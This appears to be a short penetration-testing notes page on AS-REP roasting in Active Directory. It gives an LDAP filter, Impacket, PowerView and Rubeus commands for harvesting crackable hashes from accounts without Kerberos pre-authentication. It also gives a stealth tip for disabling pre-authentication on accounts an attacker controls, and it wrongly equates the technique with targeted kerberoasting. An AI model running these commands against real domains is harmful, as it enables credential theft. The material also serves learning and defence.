#impacket #powershell #rubeus
- Also known as targeted kerberoasting.
- In kerberos, pre-authentication is required for users. 
- Pre-Authentication is when a user sends the timestamp encrypted with it's kerberos key to request TGT (AS-REQ)
- In some cases, some users may have the `DONT_REQUIRE_PREAUTH` flag set. These users don't need to encrypt their timestamp with their kerberos key, hence anyone can create AS-REQ as that user and receive AS-REP encrypted with these users's key.
- AS-REProast involves impersonating these users and receiving the AS-REP. The AS-REP can be cracked offline to recover the password of the user.
- LDAP filter to query users without pre-authentication.
```ldap
(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
```
- Impacket's GetNPUsers.py script can be used to get the users without pre-authentication and get their AS-REP data.
```bash
# Authenticated bind. Can fetch users automatically.
GetNPUsers.py 'mydomain.local/drdragon:Password!!' -dc-ip <IP> -outputfile asrep-hashes.txt

# Supply username
GetNPUsers.py 'mydomain.local/' -usersfile username.txt -dc-ip <IP> -outputfile asrep.hash
```
- Powerview
```powershell
Get-DomainUser -PreauthNotRequired -Verbose
```
- Active Directory Module
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```
- Rubeus
```powershell
.\Rubeus.exe asreproast
```
---
If a user has `GenericAll` or `GenericWrite` on another user, they can turn enable `DONT_REQUIRE_PREAUTH` and then request for TGT for that account. This is preferred over password reset because, password is much more noisy that turning of `DONT_REQUIRE_PREAUTH`.